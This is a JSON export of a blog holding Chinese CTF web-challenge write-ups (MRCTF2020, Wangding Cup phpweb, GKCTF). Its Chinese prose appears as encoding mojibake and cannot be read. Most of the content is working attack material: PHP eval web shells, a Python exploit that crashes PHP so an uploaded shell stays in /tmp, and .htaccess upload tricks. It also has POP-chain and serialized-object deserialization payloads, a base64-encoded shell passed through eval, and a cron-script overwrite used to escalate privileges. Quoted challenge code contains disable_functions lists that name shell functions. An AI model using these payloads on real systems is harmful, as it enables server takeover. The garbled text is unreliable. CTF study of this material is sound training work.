?ç„¶è€Œå®é™…åšçš„æ—¶å€™æŠŠcookiesçš„å€¼ä¸¢è¿›å»å½“ä½œpasswordçš„å°±è¿‡å»äº†ã€‚ è¯»å–åˆ°ä¸‰ä¸ªphpæ–‡ä»¶ï¼š flflflflag.php 12345678&lt;?php$file=$_GET[&#x27;file&#x27;];if(preg_match(&#x27;/data|input|zip/is&#x27;,$file))&#123; die(&#x27;nonono&#x27;);&#125;@include($file);echo &#x27;include($_GET[&quot;file&quot;])&#x27;;?&gt; index.php 123456789101112131415161718&lt;?phpinclude &#x27;config.php&#x27;;@$name=$_GET[&#x27;name&#x27;];@$pass=$_GET[&#x27;pass&#x27;];if(md5($secret.$name)===$pass)&#123; echo &#x27;&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt; window.location.href=&quot;flflflflag.php&quot;; &lt;/script&gt;&#x27;;&#125;else&#123; setcookie(&quot;Hash&quot;,md5($secret.$name),time()+3600000); echo &quot;username/password error&quot;;&#125;?&gt;&lt;html&gt;&lt;!--md5($secret.$name)===$pass --&gt;&lt;/html&gt; config.php 1234&lt;?php$secret=&#x27;%^$&amp;$#fffdflag_is_not_here_ha_ha&#x27;;?&gt; ç”¨dirbè¿˜èƒ½æ‰«å‡ºæ¥ä¸€ä¸ªdir.php 123456789&lt;body&gt; array(2) &#123; [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; &#125; include($_GET[&quot;file&quot;])&lt;/body&gt; è¿™é‡Œä¼šåˆ—å‡ºtmpç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ï¼Œ é‚£çœ‹æ¥è¿˜æ˜¯è¦å†™ğŸè¿›å»å•Šï¼Œå¯æ˜¯ä¼ªåè®®è¢«è¿‡æ»¤äº†è¯¥æ€ä¹ˆå†™ğŸå‘¢ï¼Ÿ å‚è€ƒæ–‡ç« ï¼š 1https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;183046 ä»è¿™ç¯‡æ–‡ç« ä¸­æˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼Œå½“PHPé™·å…¥å´©æºƒçš„æ—¶å€™ä»–ä¼šè‡ªåŠ¨çš„é‡å¯ï¼Œæ¸…ç†æ‰è‡ªå·±çš„å†…å­˜ï¼Œä½†æ˜¯ä¸æ­¤åŒæ—¶è¿™å°±ä¼šå¯¼è‡´PHPä¼šåœæ­¢è‡ªå·±æ‰‹å¤´çš„å·¥ä½œï¼Œè¿™æ ·çš„è¯äºæ­¤åŒæ—¶æˆ‘ä»¬ç›´æ¥POSTä¸€æ®µæ•°æ®ï¼Œå°†ä¼šè¢«phpä¿å­˜è‡³tmpç›®å½•ä¸‹æ²¡æœ‰åœä¸‹ã€‚éšæœºç”Ÿæˆä¸€ä¸ªæ–‡ä»¶ï¼Œä½†æ˜¯åˆæ ¹æ®é¢˜ç›®çš„dir.phpï¼Œå¯ä»¥è®©æˆ‘ä»¬çœ‹è§tmpç›®å½•ä¸‹æœ‰ä»€ä¹ˆï¼Œæ‰€ä»¥ç›´æ¥åŒ…è£¹å³å¯~ æŠ„æ¥çš„expï¼š 123456789101112import requestsfrom io import BytesIOimport repayload = &quot;&lt;?php eval($_POST[a]);?&gt;&quot;file_data=&#123; &#x27;file&#x27;: BytesIO(payload.encode())&#125;url=&quot;http://a53738f6-1115-449b-b4af-167a2c1a5b1a.node3.buuoj.cn/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;try: r=requests.post(url=url,files=file_data,allow_redirects=False)except: print(1) é‡ç‚¹å°±æ˜¯ç”¨string.strip_tagsè¿™ä¸€ç‚¹æ„é€ å‡ºphpçš„å†…å­˜æº¢å‡ºå³å¯å¾—åˆ°ã€‚ä¹‹åè®¿é—®dir.phpå¯ä»¥çœ‹è§æœ‰ä»€ä¹ˆæ–‡ä»¶æˆåŠŸä¸Šä¼ ï¼š è¿›è¡Œæ–‡ä»¶åŒ…å«å³å¯ flagä¸€æ ·çš„PHP infoï¼ˆï¼‰å½“ä¸­","categories":[],"tags":[]},{"title":"MRCTF2020","slug":"MRCTF2020","date":"2020-10-29T09:51:51.000Z","updated":"2020-10-29T12:44:36.831Z","comments":true,"path":"2020/10/29/MRCTF2020/","link":"","permalink":"http://example.com/2020/10/29/MRCTF2020/","excerpt":"","text":"æ€ä¹ˆè¯´å‘¢ã€‚ã€‚æ˜¯æ–°æ‰‹é¢˜ç›®ï¼Œåˆä¸å¤ªåƒï¼Œæœ‰äº›é¢˜ç›®è„‘æ´æœ‰ç‚¹å¤§ 1.å¥—å¨ƒè¯»æºç ï¼š 12345678$query = $_SERVER[&#x27;QUERY_STRING&#x27;]; if( substr_count($query, &#x27;_&#x27;) !== 0 || substr_count($query, &#x27;%5f&#x27;) != 0 )&#123; die(&#x27;Y0u are So cutE!&#x27;);&#125; if($_GET[&#x27;b_u_p_t&#x27;] !== &#x27;23333&#x27; &amp;&amp; preg_match(&#x27;/^23333$/&#x27;, $_GET[&#x27;b_u_p_t&#x27;]))&#123; echo &quot;you are going to the next ~&quot;;&#125; å…¶ä¸­å¯ä»¥çœ‹è§è¿‡æ»¤_å’Œ%5fï¼Œé‚£æˆ‘ä»¬ç¼–ç ç»•è¿‡å°±æ— åŠæ³•äº†å•Šï¼Œä½†æ˜¯æ‰¾åˆ°å‚è€ƒæ–‡çŒ®ï¼š 1https:&#x2F;&#x2F;www.freebuf.com&#x2F;articles&#x2F;web&#x2F;213359.html å…¶ä¸­å¯¹è¿™ç§çš„ç»•è¿‡ äºæ˜¯æˆ‘ä»¬æ„é€ ç©ºæ ¼æ¥ç»•è¿‡ï¼š 1&#x2F;?b%20u%20p%20t&#x3D;23333%0a ä¹‹ååœ¨secrettw.phpä¸­ï¼ŒJSfcukç¿»è¯‘å³å¯å¾—åˆ°è®©ä¼ å€¼è¯»å–æºç ï¼š è¯»å–åˆ°æºç å¦‚ä¸‹ï¼š 12345678910111213141516171819202122232425262728&lt;?php error_reporting(0); include &#x27;takeip.php&#x27;;ini_set(&#x27;open_basedir&#x27;,&#x27;.&#x27;); include &#x27;flag.php&#x27;;if(isset($_POST[&#x27;Merak&#x27;]))&#123; highlight_file(__FILE__); die(); &#125; function change($v)&#123; $v = base64_decode($v); $re = &#x27;&#x27;; for($i=0;$i&lt;strlen($v);$i++)&#123; $re .= chr ( ord ($v[$i]) + $i*2 ); &#125; return $re; &#125;echo &#x27;Local access only!&#x27;.&quot;&lt;br/&gt;&quot;;$ip = getIp();if($ip!=&#x27;127.0.0.1&#x27;)echo &quot;Sorry,you don&#x27;t have permission! Your ip is :&quot;.$ip;if($ip === &#x27;127.0.0.1&#x27; &amp;&amp; file_get_contents($_GET[&#x27;2333&#x27;]) === &#x27;todat is a happy day&#x27; )&#123;echo &quot;Your REQUEST is:&quot;.change($_GET[&#x27;file&#x27;]);echo file_get_contents(change($_GET[&#x27;file&#x27;])); &#125;?&gt; å…¶ä¸­å¯¹IPè¿›è¡Œäº†ä¸€æ¬¡checkï¼ŒXFFä¸å¯ç”¨ï¼Œç”¨Clinet-IPå³å¯ç»•è¿‡ ä¹‹åçœ‹ä¸Šé¢çš„ç®€å•å‡½æ•°çš„é€†å‘ï¼ŒæŠŠåŠ å·æ”¹æˆå‡å·å°±è¡Œäº† 1234567891011121314151617181920&lt;?php$v = &quot;fj]a&amp;f\\b&quot;;function unchange($v)&#123; $re = &#x27;&#x27;; for($i=0;$i&lt;strlen($v);$i++)&#123; $re .= chr ( ord ($v[$i]) - $i*2 ); &#125; return $re;&#125;function change($v)&#123; $v = base64_decode($v); $re = &#x27;&#x27;; for($i=0;$i&lt;strlen($v);$i++)&#123; $re .= chr ( ord ($v[$i]) + $i*2 ); &#125; return $re;&#125;echo (change(&quot;ZmpdYSZmXGI=&quot;)); æ¯”è¾ƒæ¶å¿ƒåˆ°äººçš„æ˜¯2333çš„è¾“å‡ºï¼Œæˆ‘ä¹‹å‰æ— è®ºå¦‚ä½•è¾“å…¥éƒ½ä¸è¡Œï¼Œä¸€åº¦æ€€ç–‘äººç”Ÿï¼Œæœ€åæ‰¾åˆ°dataçš„ä¼ªåè®®å¯ä»¥ç»•è¿‡ï¼Œå‚è€ƒæ–‡ç« ï¼š 1https:&#x2F;&#x2F;blog.csdn.net&#x2F;nzjdsds&#x2F;article&#x2F;details&#x2F;82461043 æœ€åæˆåŠŸæ‹¿åˆ°flagï¼Œflagåœ¨æºç ä¸­ï¼š 2.ä½ ä¼ ä½ ğŸå‘¢åˆ†åˆ«ä¸Šä¼ .htaccesså’Œä¸€å¥è¯å³å¯ï¼š ä¸€å¥è¯ç”¨aspçš„æ ¼å¼ï¼š 1&lt;script language=&quot;php&quot;&gt;eval($_POST[1]);&lt;/script&gt; ä¹‹åç”¨èšå‰‘ğŸ”—æ‹¿flagå³å¯ï¼Œè¿™é“é¢˜æˆ‘æ¯”è¾ƒå¥‡æ€ªçš„å°±æ˜¯è¿‡æ»¤äº†å¾ˆå¤šä¸œè¥¿ï¼Œä½†æ˜¯åˆæ²¡å•¥ç”¨,æˆ‘çŒœæµ‹æ˜¯å‡ºé¢˜äººè¿‡æ»¤ä¸å¤Ÿï¼Ÿä¸ç„¶å¯ä»¥ç”¨disable_functionçš„æ¥åšçš„,è¿‡æ»¤å¦‚ä¸‹ï¼škâ€™hâ€™j 1pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld 3.Ez_bypassMD5å¼ºç­‰äºç»•è¿‡å’Œå¼±ç­‰äºç»•è¿‡ï¼š å½“ç„¶ä¹Ÿå¯ä»¥ç”¨ä¸‹é¢è¿™ä¸¤ç»„æ•°ï¼š 123hexString1 = &#x27;4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa200a8284bf36e8e4b55b35f427593d849676da0d1555d8360fb5f07fea2&#x27;hexString2 = &#x27;4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa202a8284bf36e8e4b55b35f427593d849676da0d1d55d8360fb5f07fea2&#x27; ç¬¬äºŒæ­¥ï¼› 4.PYWebsite çœ‹åˆ°è¿™å¥è¯ï¼Œç›´æ¥ä¼ªé€ XFFå³å¯ 5.Ezpopé¦–å…ˆå®¡è®¡æºç ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&lt;?php//flag is in flag.php//WTF IS THIS?//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95//And Crack It!class Modifier &#123; protected $var; public function append($value)&#123; include($value); &#125; public function __invoke()&#123; $this-&gt;append($this-&gt;var); &#125;&#125;class Show&#123; public $source; public $str; public function __construct($file=&#x27;index.php&#x27;)&#123; $this-&gt;source = $file; echo &#x27;Welcome to &#x27;.$this-&gt;source.&quot;&lt;br&gt;&quot;; &#125; public function __toString()&#123; return $this-&gt;str-&gt;source; &#125; public function __wakeup()&#123; if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\\.\\./i&quot;, $this-&gt;source)) &#123; echo &quot;hacker&quot;; $this-&gt;source = &quot;index.php&quot;; &#125; &#125;&#125;class Test&#123; public $p; public function __construct()&#123; $this-&gt;p = array(); &#125; public function __get($key)&#123; $function = $this-&gt;p; return $function(); &#125;&#125;if(isset($_GET[&#x27;pop&#x27;]))&#123; @unserialize($_GET[&#x27;pop&#x27;]);&#125;else&#123; $a=new Show; highlight_file(__FILE__);&#125; æˆ‘è‡ªå·±å®¡è®¡çš„æ—¶å€™æ„Ÿè§‰æœ‰ç‚¹æ‡µï¼Œé¦–å…ˆæˆ‘ä»¬å¯èƒ½è¦ç”¨åˆ°çš„æ˜¯includeè¿™ä¹ˆä¸€ä¸ªå‡½æ•°ï¼Œè€Œvarå‡½æ•°ä¼šåœ¨__invokeçš„æ—¶å€™å»è°ƒç”¨$varï¼Œè¿›è¡Œæ–‡ä»¶åŒ…å«ï¼Œäºæ˜¯æˆ‘ä»¬æ„é€ å¦‚ä¸‹ï¼š 1$var=&quot;php://filter/convert.base64-encode/resource=flag.php&quot;; æ¥ç€å°±æ˜¯å»æ‰¾å“ªé‡Œå¯ä»¥è°ƒç”¨åˆ°è¿™ä¹ˆä¸€ä¸ª__invokeæ–¹æ³•äº†ï¼Œæ ¹æ®PHPçš„æ‰‹å†Œï¼Œæˆ‘ä»¬ä¼šåœ¨ å‡½æ•°è¢«å½“æˆæ–¹æ³•è°ƒç”¨çš„æ—¶å€™è‡ªåŠ¨è°ƒç”¨ï¼Œä¾‹å­å¦‚ä¸‹ï¼š 123$mod = new Modifier();$mod();//åœ¨ä¸‹é¢åˆ™ä¼šè‡ªåŠ¨è°ƒç”¨invokeæ–¹æ³• å¾€ä¸‹çœ‹å°±èƒ½çœ‹è§Testæ–¹æ³•ï¼Œå› ä¸ºå®ƒè¿”å›äº†ä¸€ä¸ªfunctionã€‚æ‰€ä»¥è®©Testå»get ä¸€ä¸‹Modifierç±»ï¼Œå°±ä¼šå…ˆè°ƒç”¨__getæ–¹æ³•ï¼Œç»“æœå› ä¸ºè¢«å½“æˆäº†å‡½æ•°è¿›è¡Œè°ƒç”¨ï¼Œæˆ‘ä»¬çš„Modifierç±»è‡ªåŠ¨çš„è°ƒç”¨äº†invokeæ–¹æ³•ã€‚ ç„¶åæˆ‘å¡åœ¨è¿™é‡Œå¥½ä¹…..æœ€åçœ‹äº†å¸ˆå‚…ä»¬çš„åšå®¢æ‰æƒ³åˆ°è¯¥æ€ä¹ˆå†™..è¯´å®è¯è¿˜æ˜¯æœ‰ç‚¹æ‡µé€¼ 1234567891011 public function __toString()&#123; return $this-&gt;str-&gt;source; &#125; public function __wakeup()&#123; if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\\.\\./i&quot;, $this-&gt;source)) &#123; echo &quot;hacker&quot;; $this-&gt;source = &quot;index.php&quot;; &#125; &#125;&#125; åœ¨showå‡½æ•°å½“ä¸­ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°__wakeupå‡½æ•°ï¼Œå› ä¸ºå®ƒè¿›è¡Œäº†echoæ“ä½œï¼Œæ­¤æ—¶ä¾¿ä¼šè§¦å‘stringå‡½æ•° ä¿®æ”¹sourceçš„å€¼ã€‚ æœ€åè¦æ³¨æ„protectedå±æ€§ä¿®é¥°çš„å˜é‡åº”è¯¥ç”¨urlencodeè¿›è¡Œä¿®é¥°é¿å…ä¸å¯è§å­—ç¬¦ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;?phpclass Modifier &#123; protected $var=&quot;php://filter/convert.base64-encode/resource=flag.php&quot;;&#125;class Show&#123; public $source; public $str; public function __construct($file=&#x27;index.php&#x27;)&#123; $this-&gt;source = $file; &#125; public function __wakeup()&#123;// phpinfo(); if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\\.\\./i&quot;, $this-&gt;source)) &#123; echo &quot;hacker&quot;; $this-&gt;source = &quot;index.php&quot;; &#125; &#125;&#125;class Test&#123; public $p;// private $c; public function __construct()&#123; $this-&gt;p = array(); &#125; public function __get($key)&#123;// phpinfo(); $function = $this-&gt;p; return $function(); &#125;&#125;$test = new Test();$mod = new Modifier();$show1 = new Show();$show1 -&gt;str =$test;$show1-&gt;str-&gt;p = $mod;$show2 = new Show($show1);echo urlencode(serialize($show2));//å½“æˆ‘ä»¬è§¦å‘ è¿™é‡Œå°±æ˜¯è¿›è¡Œäº†ä¸€ä¸ªå¥—å¨ƒï¼Œå½“ååºåˆ—åŒ–çš„æ—¶å€™å‘¢ï¼Œshowæ–¹æ³•è¢«ååºåˆ—åŒ–ï¼Œè°ƒç”¨äº†wakeupçš„å‡½æ•°ï¼Œä¹‹ååˆå› ä¸º __construct,è¿›è¡Œäº†ä¸€å¥è¾“å‡ºï¼Œæ‰€ä»¥å°±é€ æˆäº†toStringè°ƒç”¨ï¼Œåœ¨æ­¤ä¹‹å‰æˆ‘ä»¬æ„é€ å¥½è¯­å¥å³å¯ $show2 çº¯ç²¹çš„æ˜¯è¿›è¡Œä¸€æ¬¡wakeupè°ƒç”¨ï¼ 6.Ezadulté¡µé¢å•¥ä¹Ÿçœ‹ä¸å‡ºæ¥ï¼Œç›´æ¥www.zipä¸‹äº†ä¸€æ³¢ä»£ç ï¼Œä¹‹åå‘ç°æ˜¯ä¼ªéšæœºæ•°çˆ†ç ´ï¼Œæ„é€ ä¸¤ä¸ªè„šæœ¬ï¼š 123456789101112str1 = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;str2 = &#x27;KVQP0LdJKRaV3n9D&#x27;str3 = str1[::-1]res = &#x27;&#x27;for i in range(len(str2)): for j in range(len(str1)): if str2[i] == str1[j]: res += str(j) + &#x27; &#x27; + str(j) + &#x27; &#x27; + &#x27;0&#x27; + &#x27; &#x27; + str(len(str1) - 1) + &#x27; &#x27; breakprint(res)#ç»“æœ 36 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61 ä¸‹è½½php_mt_randé‚£ä¸ªè„šæœ¬ï¼Œä½¿ç”¨æ•™ç¨‹ï¼š è®°å¾—ç”¨makeç¼–è¯‘cè¯­è¨€çš„ä¸œè¥¿ï¼Œä¹‹å./è¿è¡Œå³å¯ï¼š è·‘å‡ºå…¬é’¥æ¥ï¼š1775196155 12345678910111213141516171819202122&lt;?phpmt_srand(1775196155);//å…¬é’¥function public_key($length = 16) &#123; $strings1 = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;; $public_key = &#x27;&#x27;; for ( $i = 0; $i &lt; $length; $i++ ) $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1); return $public_key;&#125;//ç§é’¥function private_key($length = 12) &#123; $strings2 = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;; $private_key = &#x27;&#x27;; for ( $i = 0; $i &lt; $length; $i++ ) $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1); return $private_key;&#125;echo public_key();echo private_key();?&gt; ä¹‹åå¯†ç ç”¨ä¸‡èƒ½å¯†ç ä¸€è¿‡ï¼Œå³å¯å¾—åˆ°flag åé¢çš„ä¸¤ä¸ªä¸€ä¸ªå¤ªéš¾ä¸€ä¸ªæ˜¯é¢˜ç›®downæ‰äº†å®Œå…¨ç”¨ä¸äº†ã€‚ã€‚","categories":[],"tags":[]},{"title":"2020ç½‘é¼æ¯phpweb","slug":"2020ç½‘é¼æ¯phpweb","date":"2020-10-28T11:19:40.000Z","updated":"2020-11-17T06:15:44.475Z","comments":true,"path":"2020/10/28/2020ç½‘é¼æ¯phpweb/","link":"","permalink":"http://example.com/2020/10/28/2020%E7%BD%91%E9%BC%8E%E6%9D%AFphpweb/","excerpt":"","text":"1.è®¿é—®é¡µé¢curl+uï¼Œå¯ä»¥æŸ¥çœ‹åˆ°è¿™äº›ï¼š 1234&lt;form id=form1 name=form1 action=&quot;index.php&quot; method=post&gt; &lt;input type=hidden id=func name=func value=&#x27;date&#x27;&gt; &lt;input type=hidden id=p name=p value=&#x27;Y-m-d h:i:s a&#x27;&gt;&lt;/body&gt; è¿™æ ·çš„è¯æˆ‘ä»¬æ¨æµ‹å®ƒå°±æ˜¯ç”¨äº†ä¸€ä¸ªcall_user_funcçš„å›è°ƒå‡½æ•°.. ç„¶åè‡ªå·±åœ¨è¿™é‡Œå¡äº†å¾ˆä¹…ï¼Œæœ€åæ‰æƒ³èµ·æ¥file_get_contentså‡½æ•°å¯ä»¥è¯»æ–‡ä»¶ï¼Œ äºæ˜¯æ„é€ ï¼š å¾—åˆ°æºç  123456789101112131415161718192021222324252627282930&lt;?php $disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;, &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;); function gettime($func, $p) &#123; $result = call_user_func($func, $p); $a= gettype($result); if ($a == &quot;string&quot;) &#123; return $result; &#125; else &#123;return &quot;&quot;;&#125; &#125; class Test &#123; var $p = &quot;Y-m-d h:i:s a&quot;; var $func = &quot;date&quot;; function __destruct() &#123; if ($this-&gt;func != &quot;&quot;) &#123; echo gettime($this-&gt;func, $this-&gt;p); &#125; &#125; &#125; $func = $_REQUEST[&quot;func&quot;]; $p = $_REQUEST[&quot;p&quot;]; if ($func != null) &#123; $func = strtolower($func); if (!in_array($func,$disable_fun)) &#123; echo gettime($func, $p); &#125;else &#123; die(&quot;Hacker...&quot;); &#125; &#125; ?&gt; ä¹‹åæˆ‘åˆå¡ä½äº†ï¼Œçœ‹ä¼¼å¥½åƒæ˜¯ååºåˆ—åŒ–ï¼Œåˆå¥½åƒä¸æ˜¯å•Šï¼Ÿæ‰¾ä¸åˆ°ååºåˆ—åŒ–çš„ç‚¹ï¼Œä¸€æ—¶é—´åˆåƒµä½äº†ï¼Œè¿‡äº†ä¸€ä¼šå„¿çœ‹äº†å¤§ä½¬çš„WPæ‰æ„è¯†åˆ°æ˜¯è‡ªå·±æ€è·¯è¿˜ä¸å¤Ÿçµæ´»ï¼Œè¿™é“é¢˜æ²¡æœ‰unserializeï¼Œä½†æ˜¯å¯ä»¥åŠ¨è°ƒå‡½æ•°ï¼Œå®¡è®¡ä»£ç ä¸­çš„Testç±»ï¼Œå…¶å®ä»–æ˜¯æœ‰gettimeçš„ï¼Œè¿™ä¸ªå‡½æ•°å°±æ˜¯ä¸€ä¸ªåŠ¨è°ƒå‡½æ•°ï¼Œé‚£æˆ‘ä»¬çš„æ€è·¯å°±å¾ˆæ˜ç¡® 2.æ„é€ payload1234567891011121314&lt;?phpclass Test &#123; var $p = &quot;ls&quot;; var $func = &quot;system&quot;;// function __destruct() &#123;// if ($this-&gt;func != &quot;&quot;) &#123;// echo gettime($this-&gt;func, $this-&gt;p);// &#125;// &#125;&#125;$test = new Test();echo (serialize($test)); ä¹‹åå°†è¿™ä¸€æ®µå¸¦å…¥åˆ°é¢˜ç›®å½“ä¸­ï¼Œæœ€ç»ˆåœ¨tmpç›®å½•ä¸‹æ‰¾åˆ°","categories":[],"tags":[{"name":"BUU","slug":"BUU","permalink":"http://example.com/tags/BUU/"}]},{"title":"GKCTF","slug":"GKCTF","date":"2020-10-27T08:04:11.000Z","updated":"2020-11-17T06:17:52.979Z","comments":true,"path":"2020/10/27/GKCTF/","link":"","permalink":"http://example.com/2020/10/27/GKCTF/","excerpt":"","text":"æŠ½ç©ºæŠŠGKCTFçš„é¢˜ç›®åˆ·äº†ï¼Œå…ˆä»ç¬¬ä¸€é¢˜å¼€å§‹è¯´å§ 1.Check inè¯´æ˜¯ä¸€é“ç­¾åˆ°é¢˜ï¼Œä½†æ˜¯å¾—ç”¨åˆ°pwnçš„çŸ¥è¯†ã€è™½ç„¶expç›´æ¥å°±èƒ½æ‰“äº† ç¬¬ä¸€æ­¥è®¿é—®å°±èƒ½å®¡è®¡åˆ°ä»£ç ï¼š 1234567891011121314151617181920&lt;?php highlight_file(__FILE__);class ClassName&#123; public $code = null; public $decode = null; function __construct() &#123; $this-&gt;code = @$this-&gt;x()[&#x27;Ginkgo&#x27;]; $this-&gt;decode = @base64_decode( $this-&gt;code ); @Eval($this-&gt;decode); &#125; public function x() &#123; return $_REQUEST; &#125;&#125;new ClassName(); å°±æ˜¯ä¸€ä¸ªå¾ˆç®€å•çš„åºåˆ—åŒ–ï¼Œæˆ‘ä»¬ç›´æ¥base64ç¼–ç Ginkgoä¹‹åçš„å€¼å³å¯ã€‚ 1?Ginkgo=cGhwaW5mbygpOw== å®¡è®¡åˆ°PHPçš„ä»£ç ï¼Œä¸‹ä¸€æ­¥æˆ‘ä»¬ä¼šå‘ç°è‡ªå·±èšå‰‘è¿æ¥ä¸ä¸Šï¼Œæ²¡åŠæ³•ï¼Œåªèƒ½è‡ªå·±å†å†™ä¸€ä¸ªshelläº† 1?Ginkgo=ZXZhbCgkX1BPU1Rbc2FrYW5pXSk7AA== å¯†ç æ˜¯sakaniï¼Œä¹‹åå°±å¯ä»¥ç”¨èšå‰‘é“¾æ¥ä¸Šå»äº†ï¼Œä½†æ˜¯æˆ‘ä»¬å‘ç°flagæ²¡æ³•è¯»å•Šã€‚è€Œä¸”å› ä¸ºdisable_functionï¼Œæˆ‘ä»¬ æ²¡æœ‰åŠæ³•ä½¿ç”¨è™šæ‹Ÿç»ˆç«¯äº†ã€‚ ä½†æ˜¯æˆ‘ä»¬æŸ¥çœ‹ç‰ˆæœ¬ï¼Œç‰ˆæœ¬ä¸ºPHP7.3ï¼Œå¯ä»¥å°è¯•ç”¨å†…æ ¸æ¼æ´ææƒï¼Œåœ¨tmpç›®å½•ï¼ˆ777ï¼‰ï¼Œä¸Šä¼ exp 1https://github.com/mm0r1/exploits ä¸Šä¼ è¿™é‡Œçš„gcæ¼æ´ï¼Œä¹‹åæ‰§è¡Œå‘½ä»¤å³å¯ 2.è€å…«å°è¶…å¸‚å„¿æ ¹æ®è¿™ç¯‡æ–‡ç« å¯ä»¥åšå‡ºæ¥å‰åŠæ®µæˆåŠŸæ‹¿åˆ°shellï¼š 1https:&#x2F;&#x2F;www.nctry.com&#x2F;1660.html è¿™é‡Œæˆ‘ä¼ å…¥æˆåŠŸä¹‹åè·¯å¾„ä¸ºï¼š 1http:&#x2F;&#x2F;d315d6f1-ec5d-40f2-9c4f-358445b37fba.node3.buuoj.cn&#x2F;public&#x2F;static&#x2F;index&#x2F;default&#x2F;1.php ç”¨èšå‰‘è¿å…¥ï¼Œæ ¹ç›®å½•ä¸‹æ‰¾åˆ°flagå´ä¸èƒ½è¯»ï¼Œè¯»atuo.shå¯ä»¥çŸ¥é“å®ƒæ¯åˆ†é’Ÿä¼šæ‰§è¡Œä¸€æ¬¡makeflaghint.pyï¼ŒåŒæ—¶å…¶æƒé™æ˜¯766ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥æ”¹~ï¼Œé‚£æˆ‘ä»¬å»æ”¹è¿™ä¸ªpyçš„å†…å®¹è®©ä»–è¯»flagå³å¯ï¼Œç­‰ä¸€åˆ†é’Ÿï¼Œè¯»åˆ°flag 3.EzNodeå°±æ˜¯ä¸€ä¸ªå¾ˆåŸºç¡€çš„ä»£ç å®¡è®¡ï¼š 12345678910111213141516171819202122232425262728app.use(bodyParser.urlencoded(&#123; extended: false &#125;));app.use(bodyParser.json());// 2020.1/WORKER2 è€æ¿è¯´ä¸ºäº†åæœŸæ–¹ä¾¿ä¼˜åŒ–app.use((req, res, next) =&gt; &#123; if (req.path === &#x27;/eval&#x27;) &#123; let delay = 60 * 1000; console.log(delay); if (Number.isInteger(parseInt(req.query.delay))) &#123; delay = Math.max(delay, parseInt(req.query.delay)); &#125; const t = setTimeout(() =&gt; next(), delay); // 2020.1/WORKER3 è€æ¿è¯´è®©æˆ‘ä¼˜åŒ–ä¸€ä¸‹é€Ÿåº¦ï¼Œæˆ‘å°±ç›´æ¥è¿™æ ·å†™äº†ï¼Œå…¶ä»–äººå†™äº†å•¥å…³æˆ‘päº‹ setTimeout(() =&gt; &#123; clearTimeout(t); console.log(&#x27;timeout&#x27;); try &#123; res.send(&#x27;Timeout!&#x27;); &#125; catch (e) &#123; &#125; &#125;, 1000); &#125; else &#123; next(); &#125;&#125;); æ³¨æ„æ ¸å¿ƒä»£ç åœ¨worker2åˆ°worker3ä¹‹é—´ï¼Œæˆ‘ä»¬å‘ç°å¦‚æœdelayè¢«è®¾ç½®æˆäº†60*1000 è€Œè¶…æ—¶æ˜¯1000.å¦‚æœæ²¡æœ‰è¶…æ—¶ï¼Œåè€Œä¼šnextï¼Œä¹Ÿå°±æ˜¯ä¼šç»§ç»­æ‰§è¡Œä»£ç ï¼Œå¦åˆ™ç›´æ¥å¼¹å›å»è¶…æ—¶ï¼Œäºæ˜¯æˆ‘ä»¬çœ‹ä¸‹ä¸€æ­¥ 123456789101112app.post(&#x27;/eval&#x27;, function (req, res) &#123; let response = &#x27;&#x27;; if (req.body.e) &#123; try &#123; response = saferEval(req.body.e); &#125; catch (e) &#123; response = &#x27;Wrong Wrong Wrong!!!!&#x27;; &#125; &#125; 